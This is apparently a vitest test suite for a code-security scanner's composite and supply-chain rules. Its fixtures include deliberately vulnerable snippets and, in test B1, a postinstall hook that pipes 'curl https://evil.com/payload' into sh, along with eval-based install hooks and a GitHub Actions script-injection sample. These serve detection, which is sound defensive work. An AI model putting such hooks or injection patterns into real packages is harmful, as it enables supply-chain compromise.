/**
 * Phase 2–5 feature test suite.
 *
 * Covers:
 *   A. Composite Rules (Phase 2) — 13 new rules
 *   B. Supply Chain Scanner (Phase 3) — 11 checks
 *   C. Accuracy Improvements (Phase 4) — inline suppression, sanitizer proximity,
 *      example/docs classification, dynamic confidence
 *   D. Enhanced Composite Engine (Phase 5) — mustNotContain, sourceBeforeSink,
 *      maxLineDistance
 */

import { describe, it, expect } from 'vitest'
import { scanIssues } from '@/lib/code/scanner/scanner'
import { createEmptyIndex, indexFile } from '@/lib/code/code-index'
import type { CodeIssue } from '@/lib/code/scanner/types'

// ============================================================================
// Shared helpers
// ============================================================================

function scanCode(filename: string, code: string, lang?: string) {
  let index = createEmptyIndex()
  index = indexFile(index, filename, code, lang)
  return scanIssues(index, null)
}

function scanMultiFile(files: Array<{ path: string; code: string; lang?: string }>) {
  let index = createEmptyIndex()
  for (const f of files) {
    index = indexFile(index, f.path, f.code, f.lang)
  }
  return scanIssues(index, null)
}

function issuesForRule(issues: CodeIssue[], ruleId: string) {
  return issues.filter(i => i.ruleId === ruleId)
}

// ============================================================================
// A. Composite Rules (Phase 2)
// ============================================================================

describe('Phase 2: Composite Rules', () => {
  describe('CSRF Detection', () => {
    it('A1: detects Express POST without CSRF middleware', () => {
      const code = [
        "const express = require('express')",
        'const app = express()',
        "app.post('/transfer', (req, res) => { transfer(req.body.amount) })",
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-csrf-missing-express')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('warning')
      expect(hits[0].cwe).toBe('CWE-352')
    })

    it('A2: suppresses CSRF when csurf middleware is present', () => {
      const code = [
        "const express = require('express')",
        "const csurf = require('csurf')",
        'const app = express()',
        'app.use(csurf({ cookie: true }))',
        "app.post('/transfer', (req, res) => { transfer(req.body.amount) })",
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-csrf-missing-express')
      expect(hits).toHaveLength(0)
    })

    it('A3: detects Django view without CSRF protection', () => {
      const code = [
        'class TransferView(APIView):',
        '    def post(self, request):',
        "        transfer(request.data['amount'])",
        "        return Response({'ok': True})",
      ].join('\n')
      const result = scanCode('views.py', code, 'python')
      const hits = issuesForRule(result.issues, 'composite-csrf-missing-django-view')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-352')
    })
  })

  describe('Missing Authentication', () => {
    it('A4: detects router routes without auth middleware', () => {
      const code = [
        "const router = require('express').Router()",
        "router.get('/users', (req, res) => { res.json(users) })",
        "router.post('/users', (req, res) => { createUser(req.body) })",
      ].join('\n')
      const result = scanCode('src/routes/users.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-missing-auth-express-route')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-862')
    })

    it('A5: suppresses auth rule when passport.authenticate present', () => {
      const code = [
        "const router = require('express').Router()",
        "const passport = require('passport')",
        "router.get('/users', passport.authenticate('jwt'), (req, res) => { res.json(users) })",
      ].join('\n')
      const result = scanCode('src/routes/users.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-missing-auth-express-route')
      expect(hits).toHaveLength(0)
    })
  })

  describe('File Upload Validation', () => {
    it('A6: detects upload without type/size validation', () => {
      const code = [
        "const multer = require('multer')",
        "const upload = multer({ dest: 'uploads/' })",
        "app.post('/upload', upload.single('file'), (req, res) => { processFile(req.file.path) })",
      ].join('\n')
      const result = scanCode('src/upload.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-file-upload-no-validation')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-434')
    })

    it('A7: suppresses upload rule when fileFilter present', () => {
      const code = [
        "const multer = require('multer')",
        'const upload = multer({ dest: "uploads/", fileFilter: validateFile })',
        "app.post('/upload', upload.single('file'), (req, res) => { processFile(req.file.path) })",
      ].join('\n')
      const result = scanCode('src/upload.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-file-upload-no-validation')
      expect(hits).toHaveLength(0)
    })
  })

  describe('Mass Assignment', () => {
    it('A8: detects ORM create with raw req.body', () => {
      const code = [
        "app.post('/users', async (req, res) => {",
        '  const user = await User.create(req.body)',
        '  res.json(user)',
        '})',
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-mass-assignment-orm')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-915')
    })

    it('A9: detects Sequelize bulkCreate with req.body', () => {
      const code = [
        "app.post('/users/batch', async (req, res) => {",
        '  const users = await User.bulkCreate(req.body)',
        '  res.json(users)',
        '})',
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-mass-assignment-sequelize')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-915')
    })
  })

  describe('IDOR Detection', () => {
    it('A10: detects findById from req.params without ownership check', () => {
      const code = [
        "app.get('/items/:id', async (req, res) => {",
        '  const item = await Item.findById(req.params.id)',
        '  res.json(item)',
        '})',
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-idor-direct-lookup')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-639')
    })
  })

  describe('TOCTOU Race Condition', () => {
    it('A11: detects sync TOCTOU (existsSync before readFileSync)', () => {
      const code = [
        "const fs = require('fs')",
        'if (fs.existsSync(path)) {',
        '  const data = fs.readFileSync(path)',
        '  process(data)',
        '}',
      ].join('\n')
      const result = scanCode('src/io.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-toctou-file-check')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-367')
    })

    it('A12: detects async TOCTOU (access before writeFile)', () => {
      const code = [
        "const fs = require('fs/promises')",
        'async function updateFile(path, data) {',
        '  await fs.access(path)',
        '  await fs.writeFile(path, data)',
        '}',
      ].join('\n')
      const result = scanCode('src/io.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-toctou-async-file')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-367')
    })
  })

  describe('WebSocket Authentication', () => {
    it('A13: detects WebSocket server without auth', () => {
      const code = [
        "const { WebSocketServer } = require('ws')",
        'const wss = new WebSocketServer({ port: 8080 })',
        "wss.on('connection', (ws) => { ws.on('message', (data) => process(data)) })",
      ].join('\n')
      const result = scanCode('src/ws.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-websocket-no-auth')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-1385')
    })

    it('A14: suppresses WebSocket rule when verifyClient present', () => {
      const code = [
        "const { WebSocketServer } = require('ws')",
        'const wss = new WebSocketServer({ port: 8080, verifyClient: checkAuth })',
      ].join('\n')
      const result = scanCode('src/ws.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-websocket-no-auth')
      expect(hits).toHaveLength(0)
    })
  })

  describe('Open Redirect', () => {
    it('A15: detects res.redirect with req.query input', () => {
      const code = [
        "app.get('/login', (req, res) => {",
        '  const returnUrl = req.query.returnUrl',
        '  res.redirect(returnUrl)',
        '})',
      ].join('\n')
      const result = scanCode('src/auth.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-open-redirect-response')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-601')
    })
  })

  describe('Async Error Handling', () => {
    it('A16: detects async function without try-catch', () => {
      const code = [
        'async function processOrder(orderId) {',
        '  const order = await db.getOrder(orderId)',
        '  await sendConfirmation(order.email)',
        '  await updateInventory(order.items)',
        '}',
      ].join('\n')
      const result = scanCode('src/orders.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-async-no-try-catch')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-390')
    })

    it('A17: suppresses async rule when try-catch is present', () => {
      const code = [
        'async function processOrder(orderId) {',
        '  try {',
        '    const order = await db.getOrder(orderId)',
        '    await sendConfirmation(order.email)',
        '  } catch (err) {',
        '    logger.error(err)',
        '  }',
        '}',
      ].join('\n')
      const result = scanCode('src/orders.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-async-no-try-catch')
      expect(hits).toHaveLength(0)
    })
  })

  describe('Sensitive Data in URL', () => {
    it('A18: detects password in query parameter', () => {
      const code = 'const url = "https://api.myapp.com/login?password=secret123&user=admin"'
      const result = scanCode('src/auth.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'sensitive-data-in-url')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-598')
    })

    it('A19: detects api_key in query parameter', () => {
      const code = 'const endpoint = "https://api.service.com/data?api_key=abc123&format=json"'
      const result = scanCode('src/api.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'sensitive-data-in-url')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })
  })

  describe('Composite rule requires ALL patterns', () => {
    it('A20: CSRF rule does not fire without state-changing routes', () => {
      const code = [
        "const express = require('express')",
        'const app = express()',
        'app.use(express.json())',
        'app.listen(3000)',
      ].join('\n')
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-csrf-missing-express')
      expect(hits).toHaveLength(0)
    })

    it('A21: TOCTOU rule does not fire with only existsSync', () => {
      const code = [
        "const fs = require('fs')",
        "if (fs.existsSync('/tmp/flag')) {",
        "  console.log('Flag file exists')",
        '}',
      ].join('\n')
      const result = scanCode('src/check.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-toctou-file-check')
      expect(hits).toHaveLength(0)
    })
  })
})

// ============================================================================
// B. Supply Chain Scanner (Phase 3)
// ============================================================================

describe('Phase 3: Supply Chain Scanner', () => {
  describe('Suspicious Lifecycle Scripts', () => {
    it('B1: detects curl in postinstall', () => {
      const pkg = JSON.stringify({
        name: 'evil-pkg',
        scripts: { postinstall: 'curl https://evil.com/payload | sh' },
      }, null, 2)
      const result = scanCode('package.json', pkg, 'json')
      const hits = issuesForRule(result.issues, 'supply-chain-suspicious-script')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('critical')
      expect(hits[0].cwe).toBe('CWE-506')
    })

    it('B2: detects eval in preinstall', () => {
      const pkg = JSON.stringify({
        name: 'backdoor',
        scripts: { preinstall: 'node -e "eval(data)"' },
      }, null, 2)
      const result = scanCode('package.json', pkg, 'json')
      const hits = issuesForRule(result.issues, 'supply-chain-suspicious-script')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('B3: detects Buffer.from in install script', () => {
      const pkg = JSON.stringify({
        name: 'sneaky',
        scripts: { install: 'node -e "Buffer.from(encoded, \'base64\')"' },
      }, null, 2)
      const result = scanCode('package.json', pkg, 'json')
      const hits = issuesForRule(result.issues, 'supply-chain-suspicious-script')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })
  })

  describe('Star Version Dependencies', () => {
    it('B4: detects wildcard * version', () => {
      const pkg = JSON.stringify({
        name: 'my-app',
        dependencies: { lodash: '*' },
      }, null, 2)
      const result = scanCode('package.json', pkg, 'json')
      const hits = issuesForRule(result.issues, 'supply-chain-star-version')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('warning')
    })

    it('B5: does not flag pinned version', () => {
      const pkg = JSON.stringify({
        name: 'my-app',
        dependencies: { lodash: '^4.17.21' },
      }, null, 2)
      const result = scanCode('package.json', pkg, 'json')
      const hits = issuesForRule(result.issues, 'supply-chain-star-version')
      expect(hits).toHaveLength(0)
    })
  })

  describe('Git Dependencies', () => {
    it('B6: detects git+https dependency', () => {
      const pkg = JSON.stringify({
        name: 'my-app',
        dependencies: { 'my-lib': 'git+https://github.com/user/repo.git' },
      }, null, 2)
      const result = scanCode('package.json', pkg, 'json')
      const hits = issuesForRule(result.issues, 'supply-chain-git-dependency')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('info')
    })
  })

  describe('Missing Lockfile', () => {
    it('B7: detects missing lockfile', () => {
      const pkg = JSON.stringify({ name: 'app', dependencies: { express: '^4.18.0' } }, null, 2)
      let index = createEmptyIndex()
      index = indexFile(index, 'package.json', pkg, 'json')
      const result = scanIssues(index, null)
      const hits = issuesForRule(result.issues, 'supply-chain-no-lockfile')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('warning')
    })

    it('B8: does not flag when package-lock.json exists', () => {
      const pkg = JSON.stringify({ name: 'app', dependencies: { express: '^4.18.0' } }, null, 2)
      const lock = JSON.stringify({ lockfileVersion: 3, packages: {} }, null, 2)
      const result = scanMultiFile([
        { path: 'package.json', code: pkg, lang: 'json' },
        { path: 'package-lock.json', code: lock, lang: 'json' },
      ])
      const hits = issuesForRule(result.issues, 'supply-chain-no-lockfile')
      expect(hits).toHaveLength(0)
    })
  })

  describe('HTTP Registry URLs', () => {
    it('B9: detects HTTP registry in lockfile', () => {
      const lock = JSON.stringify({
        lockfileVersion: 3,
        packages: {
          'node_modules/lodash': {
            version: '4.17.21',
            resolved: 'http://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz',
            integrity: 'sha512-xyz',
          },
        },
      }, null, 2)
      const result = scanCode('package-lock.json', lock, 'json')
      const hits = issuesForRule(result.issues, 'supply-chain-http-registry')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('critical')
    })
  })

  describe('GitHub Actions Security', () => {
    it('B10: detects unpinned action (branch ref)', () => {
      const workflow = [
        'name: CI',
        'on: push',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@main',
      ].join('\n')
      const result = scanCode('.github/workflows/ci.yml', workflow, 'yaml')
      const hits = issuesForRule(result.issues, 'gha-unpinned-action')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('B11: does not flag SHA-pinned action', () => {
      const workflow = [
        'name: CI',
        'on: push',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11',
      ].join('\n')
      const result = scanCode('.github/workflows/ci.yml', workflow, 'yaml')
      const hits = issuesForRule(result.issues, 'gha-unpinned-action')
      expect(hits).toHaveLength(0)
    })

    it('B12: detects script injection via github.event', () => {
      const workflow = [
        'name: CI',
        'on: issues',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - name: Process issue',
        '        run: echo "${{ github.event.issue.title }}"',
      ].join('\n')
      const result = scanCode('.github/workflows/ci.yml', workflow, 'yaml')
      const hits = issuesForRule(result.issues, 'gha-script-injection')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('critical')
    })

    it('B13: detects write-all permissions', () => {
      const workflow = [
        'name: CI',
        'on: push',
        'permissions: write-all',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@v4',
      ].join('\n')
      const result = scanCode('.github/workflows/ci.yml', workflow, 'yaml')
      const hits = issuesForRule(result.issues, 'gha-permissions-write-all')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('B14: detects dangerous pull_request_target + checkout', () => {
      const workflow = [
        'name: PR Handler',
        'on: pull_request_target',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@v4',
        '      - run: npm test',
      ].join('\n')
      const result = scanCode('.github/workflows/pr.yml', workflow, 'yaml')
      const hits = issuesForRule(result.issues, 'gha-dangerous-trigger')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].severity).toBe('critical')
    })
  })

  describe('Python Requirements', () => {
    it('B15: detects unpinned Python dependency', () => {
      const requirements = ['requests', 'flask>=2.0', 'numpy'].join('\n')
      const result = scanCode('requirements.txt', requirements, 'text')
      const hits = issuesForRule(result.issues, 'supply-chain-unpinned-python')
      expect(hits.length).toBeGreaterThanOrEqual(2)
    })

    it('B16: does not flag pinned Python dependency', () => {
      const requirements = ['requests==2.28.0', 'flask==2.3.2', 'numpy==1.24.0'].join('\n')
      const result = scanCode('requirements.txt', requirements, 'text')
      const hits = issuesForRule(result.issues, 'supply-chain-unpinned-python')
      expect(hits).toHaveLength(0)
    })
  })
})

// ============================================================================
// C. Accuracy Improvements (Phase 4)
// ============================================================================

describe('Phase 4: Accuracy Improvements', () => {
  describe('Inline Suppression', () => {
    it('C1: // scanner-ignore does NOT suppress critical rules (requires scoped suppression)', () => {
      const code = 'const data = eval(input) // scanner-ignore'
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      // Blanket suppression is disallowed for critical-severity rules
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('C2: // scanner-ignore: eval-usage suppresses specific rule', () => {
      const code = 'const data = eval(input) // scanner-ignore: eval-usage'
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      expect(hits).toHaveLength(0)
    })

    it('C3: // scanner-ignore: other-rule does NOT suppress eval-usage', () => {
      const code = 'const data = eval(input) // scanner-ignore: other-rule'
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('C4: # scanner-ignore works with Python comments', () => {
      const code = [
        'import os',
        'os.system("ls -la") # scanner-ignore',
      ].join('\n')
      const result = scanCode('src/script.py', code, 'python')
      const allIssuesOnLine = result.issues.filter(
        i => i.file === 'src/script.py' && i.snippet.includes('os.system'),
      )
      expect(allIssuesOnLine).toHaveLength(0)
    })

    it('C5: // repolens-ignore does NOT suppress critical rules (requires scoped suppression)', () => {
      const code = 'const data = eval(input) // repolens-ignore'
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      // Blanket suppression is disallowed for critical-severity rules
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('C6: without suppression comment, eval-usage is detected', () => {
      const code = 'const data = eval(input)'
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })
  })

  describe('Sanitizer Proximity', () => {
    it('C7: eval with DOMPurify nearby downgrades confidence', () => {
      const code = [
        "import DOMPurify from 'dompurify'",
        'const clean = DOMPurify.sanitize(input)',
        'const result = eval(clean)',
      ].join('\n')
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      if (hits.length > 0) {
        expect(hits[0].confidence).not.toBe('high')
        expect(hits[0].description).toContain('sanitizer')
      }
    })

    it('C8: eval WITHOUT sanitizer nearby retains original confidence', () => {
      const lines = [
        'const x1 = 1', 'const x2 = 2', 'const x3 = 3',
        'const x4 = 4', 'const x5 = 5', 'const x6 = 6',
        'const result = eval(userInput)',
        'const x7 = 7', 'const x8 = 8',
      ]
      const code = lines.join('\n')
      const result = scanCode('src/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      if (hits.length > 0) {
        expect(hits[0].description).not.toContain('sanitizer')
      }
    })
  })

  describe('Example Directory Classification', () => {
    it('C9: non-security issue suppressed in /examples/ path', () => {
      const code = [
        'console.log("debug output")',
        'console.log("more debug")',
        'var x = 1',
      ].join('\n')
      const result = scanCode('examples/demo/app.ts', code, 'typescript')
      const nonSecurityHits = result.issues.filter(
        i => i.file === 'examples/demo/app.ts' && i.category !== 'security',
      )
      expect(nonSecurityHits).toHaveLength(0)
    })

    it('C10: security issue NOT suppressed in /examples/ path', () => {
      const code = 'const data = eval(userInput)'
      const result = scanCode('examples/demo/app.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'eval-usage')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('C11: /docs/ path also classified as example directory', () => {
      const code = [
        'console.log("debug output")',
        'var x = 1',
      ].join('\n')
      const result = scanCode('docs/tutorial/app.ts', code, 'typescript')
      const nonSecurityHits = result.issues.filter(
        i => i.file === 'docs/tutorial/app.ts' && i.category !== 'security',
      )
      expect(nonSecurityHits).toHaveLength(0)
    })
  })

  describe('Dynamic Confidence', () => {
    it('C12: config file boosts secret detection confidence', () => {
      const code = 'const secret = "sk_test_FAKE00000000000000000000000"'
      const resultConfig = scanCode('src/app.config.ts', code, 'typescript')
      const resultNormal = scanCode('src/app.ts', code, 'typescript')
      const configHits = resultConfig.issues.filter(
        i => i.file === 'src/app.config.ts' && /secret|password/i.test(i.ruleId),
      )
      const normalHits = resultNormal.issues.filter(
        i => i.file === 'src/app.ts' && /secret|password/i.test(i.ruleId),
      )
      if (configHits.length > 0 && normalHits.length > 0) {
        const order: Record<string, number> = { high: 0, medium: 1, low: 2 }
        const configConf = order[configHits[0].confidence ?? 'medium']
        const normalConf = order[normalHits[0].confidence ?? 'medium']
        expect(configConf).toBeLessThanOrEqual(normalConf)
      }
    })

    it('C13: test file downgrades confidence', () => {
      const code = 'const data = eval(input)'
      const resultTest = scanCode('src/__tests__/eval.test.ts', code, 'typescript')
      const resultNormal = scanCode('src/eval.ts', code, 'typescript')
      const testHits = issuesForRule(resultTest.issues, 'eval-usage')
      const normalHits = issuesForRule(resultNormal.issues, 'eval-usage')
      if (testHits.length > 0 && normalHits.length > 0) {
        const order: Record<string, number> = { high: 0, medium: 1, low: 2 }
        const testConf = order[testHits[0].confidence ?? 'medium']
        const normalConf = order[normalHits[0].confidence ?? 'medium']
        expect(testConf).toBeGreaterThanOrEqual(normalConf)
      }
    })
  })
})

// ============================================================================
// D. Enhanced Composite Engine (Phase 5)
// ============================================================================

describe('Phase 5: Enhanced Composite Engine', () => {
  describe('mustNotContain', () => {
    it('D1: CSRF suppressed when csurf import present', () => {
      const code = [
        "const express = require('express')",
        "const csrf = require('csurf')",
        'const app = express()',
        "app.post('/transfer', (req, res) => { transfer(req.body.amount) })",
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-csrf-missing-express')
      expect(hits).toHaveLength(0)
    })

    it('D2: upload rule suppressed when fileFilter present', () => {
      const code = [
        "const multer = require('multer')",
        'const upload = multer({ dest: "uploads/", fileFilter: check })',
        "app.post('/up', upload.single('file'), handler)",
      ].join('\n')
      const result = scanCode('src/upload.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-file-upload-no-validation')
      expect(hits).toHaveLength(0)
    })

    it('D3: auth rule suppressed when requireAuth present', () => {
      const code = [
        "const router = require('express').Router()",
        "router.get('/users', requireAuth, (req, res) => { res.json(users) })",
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-missing-auth-express-route')
      expect(hits).toHaveLength(0)
    })

    it('D4: mass assignment suppressed when .pick() present', () => {
      const code = [
        "app.post('/users', async (req, res) => {",
        "  const data = _.pick(req.body, ['name', 'email'])",
        '  const user = await User.create(req.body)',
        '  res.json(user)',
        '})',
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-mass-assignment-orm')
      expect(hits).toHaveLength(0)
    })
  })

  describe('sourceBeforeSink', () => {
    it('D5: TOCTOU fires when check appears before file operation', () => {
      const code = [
        "const fs = require('fs')",
        'if (fs.existsSync(path)) {',
        '  const data = fs.readFileSync(path)',
        '  process(data)',
        '}',
      ].join('\n')
      const result = scanCode('src/io.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-toctou-file-check')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('D6: TOCTOU does NOT fire when operation before check', () => {
      const code = [
        "const fs = require('fs')",
        'const data = fs.readFileSync(path)',
        'if (fs.existsSync(path)) {',
        "  console.log('file existed')",
        '}',
      ].join('\n')
      const result = scanCode('src/io.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-toctou-file-check')
      expect(hits).toHaveLength(0)
    })

    it('D7: path-traversal fires when req.params before readFile', () => {
      const code = [
        "app.get('/file/:name', async (req, res) => {",
        '  const name = req.params.name',
        "  const data = await readFile('./uploads/' + name)",
        '  res.send(data)',
        '})',
      ].join('\n')
      const result = scanCode('src/routes.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-path-traversal-req')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })
  })

  describe('maxLineDistance', () => {
    it('D8: SSRF fires when req.query and fetch close together', () => {
      const code = [
        "app.get('/proxy', async (req, res) => {",
        '  const url = req.query.url',
        '  const response = await fetch(url)',
        '  res.json(await response.json())',
        '})',
      ].join('\n')
      const result = scanCode('src/proxy.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-ssrf')
      expect(hits.length).toBeGreaterThanOrEqual(1)
      expect(hits[0].cwe).toBe('CWE-918')
    })

    it('D9: SSRF suppressed when patterns far apart (>50 lines)', () => {
      const lines = [
        'app.get("/proxy", async (req, res) => {',
        '  const url = req.query.url',
      ]
      for (let i = 0; i < 55; i++) {
        lines.push(`  const x${i} = ${i}`)
      }
      lines.push('  const response = await fetch(url)')
      lines.push('  res.json(await response.json())')
      lines.push('})')
      const code = lines.join('\n')
      const result = scanCode('src/proxy.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-ssrf')
      expect(hits).toHaveLength(0)
    })

    it('D10: open redirect fires when patterns close', () => {
      const code = [
        "app.get('/redirect', (req, res) => {",
        '  const target = req.query.url',
        '  res.redirect(target)',
        '})',
      ].join('\n')
      const result = scanCode('src/auth.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-open-redirect-response')
      expect(hits.length).toBeGreaterThanOrEqual(1)
    })

    it('D11: open redirect suppressed when patterns far apart (>15 lines)', () => {
      const lines = [
        'app.get("/redirect", (req, res) => {',
        '  const target = req.query.url',
      ]
      for (let i = 0; i < 20; i++) {
        lines.push(`  const x${i} = ${i}`)
      }
      lines.push('  res.redirect(target)')
      lines.push('})')
      const code = lines.join('\n')
      const result = scanCode('src/auth.ts', code, 'typescript')
      const hits = issuesForRule(result.issues, 'composite-open-redirect-response')
      expect(hits).toHaveLength(0)
    })
  })
})
